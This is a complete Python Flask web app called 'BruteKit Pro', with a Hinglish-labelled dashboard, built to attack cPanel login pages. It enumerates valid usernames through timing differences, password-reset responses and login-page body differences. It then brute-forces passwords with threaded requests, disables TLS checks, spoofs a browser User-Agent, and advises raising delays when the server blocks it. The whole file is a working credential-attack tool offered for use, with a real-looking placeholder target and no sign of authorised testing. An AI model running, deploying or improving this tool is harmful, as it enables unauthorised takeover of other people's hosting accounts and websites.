#!/usr/bin/env python3
# language: Python3 | Flask | Render deployment | Full reporting

import os, time, threading, uuid, requests, urllib3
from flask import Flask, Response, request, render_template_string
from queue import Queue, Empty

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app  = Flask(__name__)
JOBS = {}
BASE = os.path.dirname(os.path.abspath(__file__))

HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BruteKit Pro</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#080810;color:#c9d1d9;font-family:'Courier New',monospace;min-height:100vh}
.header{background:#0d0d1a;border-bottom:1px solid #1a1a3a;padding:16px 24px;display:flex;align-items:center;gap:14px}
.header h1{color:#58a6ff;font-size:1.3rem;letter-spacing:3px}
.header .ver{color:#30363d;font-size:.7rem;margin-top:2px}
.badge{background:#1a2a4a;color:#58a6ff;font-size:.65rem;padding:3px 8px;border-radius:10px;border:1px solid #1f3a6e}
.layout{display:grid;grid-template-columns:340px 1fr;height:calc(100vh - 57px)}
.sidebar{background:#0d0d1a;border-right:1px solid #1a1a3a;padding:18px;overflow-y:auto}
.main{display:flex;flex-direction:column;padding:18px;gap:14px;overflow:hidden}

.section-title{color:#58a6ff;font-size:.7rem;letter-spacing:2px;margin-bottom:10px;
  display:flex;align-items:center;gap:6px}
.section-title::before{content:'';display:inline-block;width:3px;height:12px;background:#58a6ff;border-radius:2px}

label{color:#8b949e;font-size:.75rem;display:block;margin-bottom:4px;margin-top:10px}
input,select{width:100%;background:#0d1117;color:#e6edf3;border:1px solid #21262d;
  border-radius:5px;padding:8px 11px;font-family:inherit;font-size:.85rem;transition:.2s}
input:focus,select:focus{outline:none;border-color:#58a6ff;box-shadow:0 0 0 2px rgba(88,166,255,.1)}

.mode-box{border:1px solid #21262d;border-radius:6px;padding:11px 13px;margin-bottom:7px;
  cursor:pointer;transition:.2s;position:relative}
.mode-box:hover{border-color:#30363d;background:#0d1117}
.mode-box.active{border-color:#58a6ff;background:#0d1a2d}
.mode-box input[type=radio]{position:absolute;opacity:0;width:0;height:0}
.mode-box .title{color:#e6edf3;font-size:.82rem;font-weight:bold;margin-bottom:3px}
.mode-box .desc{color:#6e7681;font-size:.72rem;line-height:1.5}
.mode-box .chip{font-size:.6rem;padding:2px 7px;border-radius:8px;float:right;margin-top:1px}
.chip-blue{background:#1a2a4a;color:#58a6ff;border:1px solid #1f3a6e}
.chip-green{background:#0d2a1a;color:#3fb950;border:1px solid #1a4a2a}
.chip-orange{background:#2a1a0d;color:#d29922;border:1px solid #4a2a0d}

.row2{display:grid;grid-template-columns:1fr 1fr;gap:8px}

.btn{width:100%;padding:11px;background:linear-gradient(135deg,#1f4e8c,#0d2a5e);
  color:#58a6ff;border:1px solid #1f3a6e;border-radius:5px;font-family:inherit;
  font-size:.9rem;font-weight:bold;cursor:pointer;letter-spacing:1px;margin-top:14px;transition:.2s}
.btn:hover{background:linear-gradient(135deg,#2a5ea0,#1a3a6e);border-color:#58a6ff}
.btn:disabled{background:#0d0d1a;color:#30363d;border-color:#1a1a2a;cursor:not-allowed}
.btn-stop{background:linear-gradient(135deg,#4e1f1f,#2a0d0d);color:#f85149;
  border-color:#4a1a1a;display:none}
.btn-stop:hover{background:linear-gradient(135deg,#5e2a2a,#3a1a1a)}

/* Stats bar */
.stats-bar{display:grid;grid-template-columns:repeat(5,1fr);gap:8px}
.stat-card{background:#0d0d1a;border:1px solid #1a1a3a;border-radius:6px;padding:10px 12px}
.stat-card .val{font-size:1.3rem;font-weight:bold;color:#58a6ff}
.stat-card .lbl{font-size:.65rem;color:#6e7681;margin-top:2px;letter-spacing:1px}
.stat-card.found .val{color:#3fb950}
.stat-card.tried .val{color:#d29922}
.stat-card.speed .val{color:#a371f7}
.stat-card.valid .val{color:#79c0ff}

/* Progress */
.progress-wrap{background:#0d0d1a;border:1px solid #1a1a3a;border-radius:6px;padding:12px 14px}
.progress-label{display:flex;justify-content:space-between;margin-bottom:7px;font-size:.75rem}
.progress-label .left{color:#8b949e}
.progress-label .right{color:#58a6ff}
.bar-bg{background:#1a1a2a;border-radius:3px;height:6px;overflow:hidden}
.bar-fill{height:100%;background:linear-gradient(90deg,#1f4e8c,#58a6ff);
  border-radius:3px;transition:width .4s;width:0%}

/* Terminal */
.terminal{background:#010409;border:1px solid #1a1a3a;border-radius:6px;
  flex:1;overflow:hidden;display:flex;flex-direction:column}
.terminal-header{padding:8px 14px;background:#0d0d1a;border-bottom:1px solid #1a1a3a;
  display:flex;align-items:center;justify-content:space-between}
.terminal-header .tit{color:#8b949e;font-size:.72rem;letter-spacing:1px}
.terminal-header .dot-row{display:flex;gap:5px}
.tdot{width:10px;height:10px;border-radius:50%}
.tdot.red{background:#f85149}
.tdot.yellow{background:#d29922}
.tdot.green{background:#3fb950}
.terminal-body{flex:1;overflow-y:auto;padding:12px 14px;font-size:.78rem;line-height:1.7}
.terminal-body::-webkit-scrollbar{width:4px}
.terminal-body::-webkit-scrollbar-track{background:#010409}
.terminal-body::-webkit-scrollbar-thumb{background:#21262d;border-radius:2px}

.t-info{color:#58a6ff}
.t-ok{color:#3fb950}
.t-fail{color:#3a4049}
.t-warn{color:#d29922}
.t-found{color:#3fb950;font-weight:bold;font-size:.88rem}
.t-err{color:#f85149}
.t-method{color:#a371f7;font-weight:bold}
.t-sep{color:#1a2a3a}
.t-valid{color:#79c0ff;font-weight:bold}
.t-report{color:#e6edf3;background:#0d1a0d;border-left:3px solid #3fb950;
  padding:6px 10px;margin:4px 0;border-radius:0 4px 4px 0}

/* Found banner */
.found-banner{display:none;background:#0d2a0d;border:1px solid #3fb950;
  border-radius:6px;padding:14px 18px;animation:glow .8s ease-in-out infinite alternate}
.found-banner .fb-title{color:#3fb950;font-size:1.1rem;font-weight:bold;margin-bottom:8px}
.found-banner .fb-cred{color:#e6edf3;font-size:.85rem;line-height:2}
.found-banner .fb-url{color:#58a6ff;font-size:.8rem;word-break:break-all;margin-top:6px}
@keyframes glow{from{box-shadow:0 0 8px rgba(63,185,80,.3)}to{box-shadow:0 0 20px rgba(63,185,80,.6)}}

@media(max-width:768px){.layout{grid-template-columns:1fr;height:auto}
  .stats-bar{grid-template-columns:repeat(3,1fr)}}
</style>
</head>
<body>

<div class="header">
  <div>
    <h1>&#9670; BRUTEKIT PRO</h1>
    <div class="ver">Render Cloud Edition — Tera IP safe</div>
  </div>
  <span class="badge">v2.0</span>
</div>

<div class="layout">

<!-- SIDEBAR -->
<div class="sidebar">
  <div class="section-title">TARGET</div>

  <label>Site URL</label>
  <input type="text" id="url" placeholder="radhewins.buzz" autocomplete="off">

  <label>cPanel Port</label>
  <select id="port">
    <option value="2083">2083 — HTTPS (zyada tar yahi hota hai)</option>
    <option value="2082">2082 — HTTP (agar 2083 band ho)</option>
  </select>

  <div style="height:12px"></div>
  <div class="section-title">MODE CHOOSE KARO</div>

  <label class="mode-box active" id="mb1">
    <input type="radio" name="mode" value="1" checked>
    <span class="chip chip-green">BEST</span>
    <div class="title">Username Dhundo → Phir Password</div>
    <div class="desc">Pehle username.txt se valid usernames find karega (3 methods se). Phir sirf unhi pe password try karega. Fast aur accurate.</div>
  </label>

  <label class="mode-box" id="mb2">
    <input type="radio" name="mode" value="2">
    <span class="chip chip-blue">DIRECT</span>
    <div class="title">Seedha Brute Force</div>
    <div class="desc">username.txt ka har username + password.txt ka har password — sab try karega. Slow but thorough.</div>
  </label>

  <label class="mode-box" id="mb3">
    <input type="radio" name="mode" value="3">
    <span class="chip chip-orange">RECON</span>
    <div class="title">Sirf Username Dhundo</div>
    <div class="desc">Teeno methods se pata karega kaun sa username valid hai — timing, reset page, aur response diff. Password nahi karega.</div>
  </label>

  <div style="height:10px"></div>
  <div class="section-title">SETTINGS</div>

  <div class="row2">
    <div>
      <label>Threads</label>
      <input type="number" id="threads" value="2" min="1" max="8">
    </div>
    <div>
      <label>Delay (sec)</label>
      <input type="number" id="delay" value="0.5" step="0.1" min="0">
    </div>
  </div>

  <button class="btn" id="btn-start" onclick="startAttack()">&#9654; START ATTACK</button>
  <button class="btn btn-stop" id="btn-stop" onclick="stopAttack()">&#9632; STOP</button>
</div>

<!-- MAIN -->
<div class="main">

  <!-- Stats -->
  <div class="stats-bar">
    <div class="stat-card">
      <div class="val" id="s-total">0</div>
      <div class="lbl">TOTAL COMBOS</div>
    </div>
    <div class="stat-card tried">
      <div class="val" id="s-tried">0</div>
      <div class="lbl">TRIED</div>
    </div>
    <div class="stat-card valid">
      <div class="val" id="s-valid">0</div>
      <div class="lbl">VALID USERS</div>
    </div>
    <div class="stat-card speed">
      <div class="val" id="s-speed">0</div>
      <div class="lbl">REQ/MIN</div>
    </div>
    <div class="stat-card found">
      <div class="val" id="s-found">0</div>
      <div class="lbl">FOUND</div>
    </div>
  </div>

  <!-- Progress -->
  <div class="progress-wrap">
    <div class="progress-label">
      <span class="left" id="p-label">Idle</span>
      <span class="right" id="p-pct">0%</span>
    </div>
    <div class="bar-bg"><div class="bar-fill" id="p-bar"></div></div>
  </div>

  <!-- Found banner -->
  <div class="found-banner" id="found-banner">
    <div class="fb-title">&#10003; CREDENTIALS MILGAYE!</div>
    <div class="fb-cred" id="found-creds"></div>
    <div class="fb-url" id="found-url"></div>
  </div>

  <!-- Terminal -->
  <div class="terminal">
    <div class="terminal-header">
      <div class="tit">LIVE OUTPUT</div>
      <div class="dot-row">
        <div class="tdot red"></div>
        <div class="tdot yellow"></div>
        <div class="tdot green" id="tdot-green"></div>
      </div>
    </div>
    <div class="terminal-body" id="terminal">
      <div class="t-info">[SYSTEM] BruteKit Pro ready.</div>
      <div class="t-info">[SYSTEM] URL daalo sidebar mein aur START karo.</div>
    </div>
  </div>

</div>
</div>

<script>
let evtSrc = null;
let startTime = null;
let triedCount = 0;
let totalCount = 0;
let validCount = 0;
let foundCount = 0;
let speedTimer = null;
let stopped = false;

// Mode box toggle
document.querySelectorAll('.mode-box').forEach((box, i) => {
  box.addEventListener('click', () => {
    document.querySelectorAll('.mode-box').forEach(b => b.classList.remove('active'));
    box.classList.add('active');
  });
});

function log(msg, cls){
  const t = document.getElementById('terminal');
  const d = document.createElement('div');
  d.className = cls || '';
  d.textContent = msg;
  t.appendChild(d);
  t.scrollTop = t.scrollHeight;
  // Limit lines
  while(t.children.length > 2000) t.removeChild(t.firstChild);
}

function setStat(id, val){ document.getElementById(id).textContent = val; }

function setProgress(pct, label){
  document.getElementById('p-bar').style.width = pct + '%';
  document.getElementById('p-pct').textContent = pct + '%';
  if(label) document.getElementById('p-label').textContent = label;
}

function startSpeedTimer(){
  let last = 0;
  speedTimer = setInterval(() => {
    const diff = triedCount - last;
    const rpm  = diff * (60/2);
    setStat('s-speed', rpm.toFixed(0));
    last = triedCount;
  }, 2000);
}

function stopSpeedTimer(){ if(speedTimer){ clearInterval(speedTimer); speedTimer=null; } }

function stopAttack(){
  stopped = true;
  if(evtSrc){ evtSrc.close(); evtSrc=null; }
  document.getElementById('btn-start').disabled = false;
  document.getElementById('btn-start').style.display = 'block';
  document.getElementById('btn-stop').style.display = 'none';
  setProgress(100, 'Stopped');
  stopSpeedTimer();
  log('[STOPPED] Attack rok diya.', 't-warn');
}

function parseMsg(raw){
  const msg = raw;
  // Extract stats from special tags
  if(msg.startsWith('STAT:')){
    const parts = msg.replace('STAT:','').split('|');
    parts.forEach(p => {
      const [k,v] = p.split('=');
      if(k==='total'){ totalCount=parseInt(v); setStat('s-total',v); }
      if(k==='tried'){ triedCount=parseInt(v); setStat('s-tried',v);
        if(totalCount>0) setProgress(Math.floor(triedCount/totalCount*100),
          `${triedCount}/${totalCount} tried`);
      }
      if(k==='valid'){ validCount=parseInt(v); setStat('s-valid',v); }
      if(k==='found'){ foundCount=parseInt(v); setStat('s-found',v); }
    });
    return null; // don't log stat lines
  }

  if(msg.startsWith('FOUND_CRED:')){
    const data = msg.replace('FOUND_CRED:','');
    const [user,pass,loginUrl] = data.split('|||');
    document.getElementById('found-banner').style.display = 'block';
    document.getElementById('found-creds').innerHTML =
      `<b>Username:</b> ${user}<br><b>Password:</b> ${pass}`;
    document.getElementById('found-url').textContent = 'Login URL: ' + loginUrl;
    foundCount++;
    setStat('s-found', foundCount);
    return null;
  }

  // Classify
  let cls = 't-fail';
  if(msg.includes('[FOUND]'))         cls = 't-found';
  else if(msg.startsWith('[+]'))      cls = 't-ok';
  else if(msg.startsWith('[*]'))      cls = 't-info';
  else if(msg.startsWith('[!]'))      cls = 't-warn';
  else if(msg.startsWith('[x]'))      cls = 't-err';
  else if(msg.startsWith('[METHOD]')) cls = 't-method';
  else if(msg.startsWith('[VALID]'))  cls = 't-valid';
  else if(msg.startsWith('[REPORT]')) cls = 't-report';
  else if(msg.startsWith('='))        cls = 't-sep';
  else if(msg.startsWith('-'))        cls = 't-fail';
  return {msg, cls};
}

function startAttack(){
  const url     = document.getElementById('url').value.trim();
  const port    = document.getElementById('port').value;
  const mode    = document.querySelector('input[name=mode]:checked').value;
  const threads = document.getElementById('threads').value;
  const delay   = document.getElementById('delay').value;

  if(!url){ log('[ERROR] URL daalo pehle!','t-err'); return; }

  stopped = false;
  if(evtSrc){ evtSrc.close(); }

  // Reset UI
  document.getElementById('terminal').innerHTML = '';
  document.getElementById('found-banner').style.display = 'none';
  document.getElementById('btn-start').disabled = true;
  document.getElementById('btn-start').style.display = 'none';
  document.getElementById('btn-stop').style.display = 'block';
  document.getElementById('tdot-green').style.background = '#3fb950';

  triedCount=0; totalCount=0; validCount=0; foundCount=0;
  setStat('s-total','0'); setStat('s-tried','0');
  setStat('s-valid','0'); setStat('s-speed','0'); setStat('s-found','0');
  setProgress(0,'Starting...');
  startTime = Date.now();
  startSpeedTimer();

  log('[*] Attack shuru ho raha hai...','t-info');

  const params = new URLSearchParams({url,port,mode,threads,delay});
  fetch('/start',{method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},body:params})
  .then(r=>r.json())
  .then(data=>{
    if(!data.job_id){ log('[ERROR] Server error','t-err'); return; }

    evtSrc = new EventSource('/stream/'+data.job_id);

    evtSrc.onmessage = function(e){
      if(stopped) return;
      const result = parseMsg(e.data);
      if(result) log(result.msg, result.cls);
    };

    evtSrc.addEventListener('done', function(){
      evtSrc.close();
      document.getElementById('btn-start').disabled = false;
      document.getElementById('btn-start').style.display = 'block';
      document.getElementById('btn-stop').style.display = 'none';
      document.getElementById('tdot-green').style.background = '#8b949e';
      setProgress(100,'Done');
      stopSpeedTimer();
      log('[*] Attack complete.','t-info');

      // Elapsed time
      const elapsed = Math.floor((Date.now()-startTime)/1000);
      const mins    = Math.floor(elapsed/60);
      const secs    = elapsed%60;
      log(`[*] Time: ${mins}m ${secs}s  |  Tried: ${triedCount}  |  Found: ${foundCount}`,'t-info');
    });

    evtSrc.onerror = function(){
      if(stopped) return;
      evtSrc.close();
      document.getElementById('btn-start').disabled = false;
      document.getElementById('btn-start').style.display = 'block';
      document.getElementById('btn-stop').style.display = 'none';
      stopSpeedTimer();
      log('[!] Connection lost.','t-err');
    };
  });
}
</script>
</body>
</html>"""

# ── Utils ────────────────────────────────────────────────────────
def load_list(filename):
    path = os.path.join(BASE, filename)
    if not os.path.exists(path):
        return []
    with open(path,"r",encoding="utf-8",errors="ignore") as f:
        return [l.strip() for l in f if l.strip()]

def emit(q, msg):
    q.put(msg)

def stat(q, **kw):
    q.put("STAT:" + "|".join(f"{k}={v}" for k,v in kw.items()))

# ── Username Enumeration — 3 Methods ────────────────────────────
def enumerate_users(host, port, scheme, usernames, q, delay):
    login_url   = f"{scheme}://{host}:{port}/login/"
    reset_urls  = [
        f"{scheme}://{host}:{port}/resetpass",
        f"{scheme}://{host}:{port}/security/resetpass",
    ]
    JUNK = "XXXINVALID_PASS_ZZZ999"
    valid_set = {}   # user → list of reasons

    def mark_valid(user, reason):
        if user not in valid_set:
            valid_set[user] = []
        if reason not in valid_set[user]:
            valid_set[user].append(reason)

    session = requests.Session()
    session.headers.update({"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})

    # ── Baseline ────────────────────────────────────────────────
    emit(q,"[*] Baseline response measure kar raha hoon...")
    baseline_time = 999
    baseline_len  = 0
    for _ in range(3):
        try:
            t0 = time.time()
            rb = session.post(login_url,
                data={"user":"zzz_def_invalid_zzz","pass":JUNK,"goto_uri":"/"},
                verify=False, timeout=15, allow_redirects=False)
            t  = (time.time()-t0)*1000
            if t < baseline_time:
                baseline_time = t
                baseline_len  = len(rb.text)
        except:
            pass
        time.sleep(0.3)
    emit(q, f"[*] Baseline — {baseline_time:.0f}ms  len:{baseline_len}")
    emit(q,"")

    # ── Method 1: Timing ────────────────────────────────────────
    emit(q,"[METHOD 1/3] Timing-based Enumeration")
    emit(q,"[*] Valid username pe server bcrypt check karta hai — thoda slow hota hai")
    emit(q,"="*52)
    for i, user in enumerate(usernames):
        try:
            times = []
            for _ in range(2):
                t0 = time.time()
                session.post(login_url,
                    data={"user":user,"pass":JUNK,"goto_uri":"/"},
                    verify=False, timeout=15, allow_redirects=False)
                times.append((time.time()-t0)*1000)
                time.sleep(0.1)
            avg = sum(times)/len(times)
            diff = avg - baseline_time
            if diff > 280:
                mark_valid(user, f"TIMING+{diff:.0f}ms")
                emit(q, f"[VALID] {user:<22} avg={avg:.0f}ms  SLOW +{diff:.0f}ms")
            else:
                emit(q, f"[-]     {user:<22} avg={avg:.0f}ms")
        except Exception as e:
            emit(q, f"[!] {user} — {e}")
        stat(q, valid=len(valid_set))
        time.sleep(delay)
    emit(q,"")

    # ── Method 2: Reset Page ─────────────────────────────────────
    emit(q,"[METHOD 2/3] Reset Password Page Enumeration")
    emit(q,"[*] /resetpass pe submit karke response diff dekhte hain")
    emit(q,"="*52)

    working_reset = None
    for ru in reset_urls:
        try:
            r = session.get(ru, verify=False, timeout=8, allow_redirects=True)
            if r.status_code == 200 and len(r.text) > 200:
                working_reset = ru
                emit(q, f"[+] Reset URL mila: {ru}")
                break
        except:
            continue

    if not working_reset:
        emit(q,"[!] Reset page accessible nahi — Method 2 skip")
    else:
        # Reset baseline
        try:
            rb2 = session.post(working_reset,
                data={"user":"zzz_invalid_zzz_def"},
                verify=False, timeout=10, allow_redirects=False)
            reset_base_len  = len(rb2.text)
            reset_base_text = rb2.text.lower()
            emit(q, f"[*] Reset baseline len: {reset_base_len}")
        except Exception as e:
            emit(q, f"[!] Reset baseline fail: {e}")
            reset_base_len = 0
            reset_base_text = ""

        for user in usernames:
            try:
                r = session.post(working_reset,
                    data={"user":user},
                    verify=False, timeout=10, allow_redirects=False)
                rlen  = len(r.text)
                rtext = r.text.lower()
                ldiff = abs(rlen - reset_base_len)

                valid_kw   = ["sent","email","reset","success","check your"]
                invalid_kw = ["not exist","invalid","no account","not found","error","incorrect"]
                has_v = any(k in rtext for k in valid_kw)
                has_i = any(k in rtext for k in invalid_kw)

                if has_v and not has_i:
                    mark_valid(user, "RESET_RESPONSE")
                    emit(q, f"[VALID] {user:<22} reset page — positive response")
                elif ldiff > 60 and not has_i:
                    mark_valid(user, f"RESET_DIFF+{ldiff}")
                    emit(q, f"[VALID] {user:<22} reset page — len diff +{ldiff}")
                else:
                    emit(q, f"[-]     {user:<22} len={rlen}")
            except Exception as e:
                emit(q, f"[!] {user} — {e}")
            stat(q, valid=len(valid_set))
            time.sleep(delay)
    emit(q,"")

    # ── Method 3: Response Body Diff ─────────────────────────────
    emit(q,"[METHOD 3/3] Login Response Body Diff")
    emit(q,"[*] Wrong pass ke sath response text mein difference dhundte hain")
    emit(q,"="*52)

    body_base_len  = baseline_len
    body_base_text = ""
    try:
        rb3 = session.post(login_url,
            data={"user":"zzz_invalid_zzz_body","pass":JUNK,"goto_uri":"/"},
            verify=False, timeout=12, allow_redirects=False)
        body_base_len  = len(rb3.text)
        body_base_text = rb3.text.lower()
        emit(q, f"[*] Body baseline len: {body_base_len}")
    except Exception as e:
        emit(q, f"[!] {e}")

    for user in usernames:
        try:
            r = session.post(login_url,
                data={"user":user,"pass":JUNK,"goto_uri":"/"},
                verify=False, timeout=12, allow_redirects=False)
            rlen  = len(r.text)
            rtext = r.text.lower()
            ldiff = abs(rlen - body_base_len)

            # Text-level diff check
            has_username_ref = user.lower() in rtext

            if ldiff > 45:
                mark_valid(user, f"BODY_DIFF+{ldiff}")
                emit(q, f"[VALID] {user:<22} body diff +{ldiff}")
            elif has_username_ref:
                mark_valid(user, "BODY_USERNAME_REF")
                emit(q, f"[VALID] {user:<22} username in response")
            else:
                emit(q, f"[-]     {user:<22} len={rlen}")
        except Exception as e:
            emit(q, f"[!] {user} — {e}")
        stat(q, valid=len(valid_set))
        time.sleep(delay)

    # ── Enum Report ───────────────────────────────────────────────
    emit(q,"")
    emit(q,"="*52)
    emit(q,"[REPORT] USERNAME ENUMERATION RESULTS")
    emit(q,"="*52)
    if valid_set:
        for u, reasons in valid_set.items():
            emit(q, f"[VALID] {u}")
            emit(q, f"[REPORT]   Detected by: {', '.join(reasons)}")
        emit(q,"")
        emit(q, f"[+] Total valid candidates: {len(valid_set)}")
    else:
        emit(q,"[!] Koi valid username nahi mila — sab usernames pe brute karenge")
    emit(q,"")
    stat(q, valid=len(valid_set))

    result = list(valid_set.keys()) if valid_set else usernames
    return result

# ── Brute Force ──────────────────────────────────────────────────
def brute_force(host, port, scheme, usernames, passwords, q, threads_n, delay):
    login_url   = f"{scheme}://{host}:{port}/login/"
    found_event = threading.Event()
    found_list  = []
    lock        = threading.Lock()
    tried_ref   = [0]
    total       = len(usernames) * len(passwords)

    emit(q, f"[*] BRUTE FORCE START — {len(usernames)} users × {len(passwords)} passwords = {total} combos")
    emit(q, "="*52)
    stat(q, total=total, tried=0, found=0)

    combo_q = Queue()
    for u in usernames:
        for p in passwords:
            combo_q.put((u,p))

    def worker():
        s = requests.Session()
        s.headers.update({"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
        while not found_event.is_set():
            try:
                user, passwd = combo_q.get(timeout=1)
            except Empty:
                break
            try:
                r = s.post(login_url,
                    data={"user":user,"pass":passwd,"goto_uri":"/"},
                    verify=False, timeout=12, allow_redirects=False)
                hit = (300 <= r.status_code < 400)
            except Exception as e:
                with lock:
                    tried_ref[0] += 1
                    emit(q, f"[!] {user}:{passwd} — {e}")
                    stat(q, tried=tried_ref[0])
                combo_q.task_done()
                time.sleep(2)
                continue

            with lock:
                tried_ref[0] += 1
                pct = int(tried_ref[0]/total*100) if total else 0
                stat(q, tried=tried_ref[0], total=total, found=len(found_list))

                if hit:
                    found_event.set()
                    found_list.append((user,passwd))
                    login_link = f"{scheme}://{host}:{port}/login/?user={user}&pass={passwd}"
                    emit(q,"="*52)
                    emit(q,f"[FOUND] *** CREDENTIALS MILGAYE ***")
                    emit(q,f"[FOUND] Username : {user}")
                    emit(q,f"[FOUND] Password : {passwd}")
                    emit(q,f"[FOUND] Login    : {login_link}")
                    emit(q,"="*52)
                    emit(q, f"FOUND_CRED:{user}|||{passwd}|||{login_link}")
                    stat(q, found=len(found_list))
                else:
                    emit(q, f"[-] [{tried_ref[0]}/{total}] {pct}%  {user}:{passwd}  HTTP {r.status_code}")

            combo_q.task_done()
            if delay > 0:
                time.sleep(delay)

    ts = []
    for _ in range(threads_n):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        ts.append(t)
    for t in ts:
        t.join()

    # Final brute report
    emit(q,"")
    emit(q,"="*52)
    emit(q,"[REPORT] BRUTE FORCE RESULTS")
    emit(q,"="*52)
    if found_list:
        for u,p in found_list:
            emit(q,f"[FOUND] {u}:{p}")
    else:
        emit(q,"[x] Credentials nahi mile.")
        emit(q,"[*] Suggestions:")
        emit(q,"    - username.txt / password.txt mein aur words daalo")
        emit(q,"    - Delay badhao agar server block kar raha hai")
        emit(q,"    - Port 2082 try karo agar 2083 pe nahi mila")
    emit(q,"")

# ── Job Runner ───────────────────────────────────────────────────
def run_job(job_id, url, port, scheme, mode, threads_n, delay):
    q = JOBS[job_id]["queue"]
    try:
        host = url.replace("https://","").replace("http://","").split(":")[0].rstrip("/")

        usernames = load_list("username.txt") or \
                    ["admin","administrator","root","cpanel","webmaster"]
        passwords = load_list("password.txt") or \
                    ["admin","admin123","123456","password","root123"]

        emit(q,f"[*] Host: {host}:{port} ({scheme})")
        emit(q,f"[*] Usernames loaded: {len(usernames)}")
        emit(q,f"[*] Passwords loaded: {len(passwords)}")
        emit(q,f"[*] Threads: {threads_n}  Delay: {delay}s")
        emit(q,"")

        if mode == "1":
            emit(q,"[*] MODE: Enum → Brute")
            valid = enumerate_users(host,port,scheme,usernames,q,delay)
            emit(q,f"[*] Valid users mil gaye: {len(valid)} — ab password brute karte hain")
            brute_force(host,port,scheme,valid,passwords,q,threads_n,delay)
        elif mode == "2":
            emit(q,"[*] MODE: Direct Brute Force")
            stat(q, total=len(usernames)*len(passwords))
            brute_force(host,port,scheme,usernames,passwords,q,threads_n,delay)
        elif mode == "3":
            emit(q,"[*] MODE: Sirf Username Enum")
            enumerate_users(host,port,scheme,usernames,q,delay)

    except Exception as e:
        emit(q,f"[!] Job error: {e}")
    finally:
        JOBS[job_id]["done"] = True
        q.put(None)

# ── Routes ───────────────────────────────────────────────────────
@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/start", methods=["POST"])
def start():
    url      = request.form.get("url","").strip()
    port_raw = request.form.get("port","2083").strip()
    mode     = request.form.get("mode","1")
    threads  = int(request.form.get("threads",2))
    delay    = float(request.form.get("delay",0.5))
    try:
        port = int(port_raw)
    except:
        port = 2083
    scheme = "http" if port == 2082 else "https"

    job_id = str(uuid.uuid4())[:8]
    JOBS[job_id] = {"queue":Queue(), "done":False}
    threading.Thread(target=run_job,
        args=(job_id,url,port,scheme,mode,threads,delay),daemon=True).start()
    return {"job_id": job_id}

@app.route("/stream/<job_id>")
def stream(job_id):
    if job_id not in JOBS:
        return "Not found", 404
    def generate():
        q = JOBS[job_id]["queue"]
        while True:
            try:
                msg = q.get(timeout=60)
                if msg is None:
                    yield "event: done\ndata: done\n\n"
                    break
                yield f"data: {msg.replace(chr(10),' ')}\n\n"
            except Empty:
                yield ": ping\n\n"
    return Response(generate(), mimetype="text/event-stream",
        headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT",5000)), debug=False)
